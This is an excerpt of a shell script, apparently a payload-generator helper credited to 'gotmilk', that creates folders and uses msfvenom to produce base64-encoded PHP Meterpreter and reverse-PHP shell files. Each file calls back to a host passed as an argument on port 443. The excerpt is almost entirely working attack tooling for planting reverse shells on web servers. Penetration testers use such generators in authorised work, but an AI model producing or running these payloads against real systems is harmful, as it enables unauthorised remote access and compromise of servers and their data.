...
echo "originaly made by gotmilk. added the php base64 encoding" 
mkdir ./$@
mkdir ./$@/linux
mkdir ./$@/windows
mkdir ./$@/php
...
msfvenom -p php/meterpreter_reverse_tcp LHOST=$@ LPORT=443 -e php/base64 -f raw >> ./$@/php/php_mp_rev_tcp_p443.php 
echo "?>" >> ./$@/php/php_mp_rev_tcp_p443.php

echo "<?php" > ./$@/php/php_rev_tcp_p443.php
msfvenom -p php/reverse_php LHOST=$@ LPORT=443 -e php/base64 -f raw >> ./$@/php/php_rev_tcp_p443.php
